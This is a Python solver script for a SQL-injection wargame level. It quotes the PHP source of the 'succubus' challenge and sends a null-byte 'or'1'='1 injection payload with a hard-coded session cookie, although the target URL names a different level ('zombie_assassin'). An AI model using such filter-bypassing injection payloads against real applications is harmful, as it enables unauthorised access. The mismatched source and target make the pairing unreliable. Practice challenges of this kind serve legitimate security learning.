import requests

"""
<?php
  include "./config.php"; 
  login_chk();
  $db = dbconnect();
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~"); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
  if(preg_match('/\'/',$_GET[id])) exit("HeHe");
  if(preg_match('/\'/',$_GET[pw])) exit("HeHe");
  $query = "select id from prob_succubus where id='{$_GET[id]}' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) solve("succubus"); 
  highlight_file(__FILE__); 
?>
"""
url = "https://los.eagle-jump.org/zombie_assassin_14dfa83153eb348c4aea012d453e9c8a.php?pw=%00%27or%271%27=%271"
cookie = dict(PHPSESSID="tv814q1qgkcg3pg22pjgl9fc95")
r = requests.get(url,cookies=cookie)
#print(r.text)
if 'Clear' in r.text:
    print("clear")
else:
    print("try again")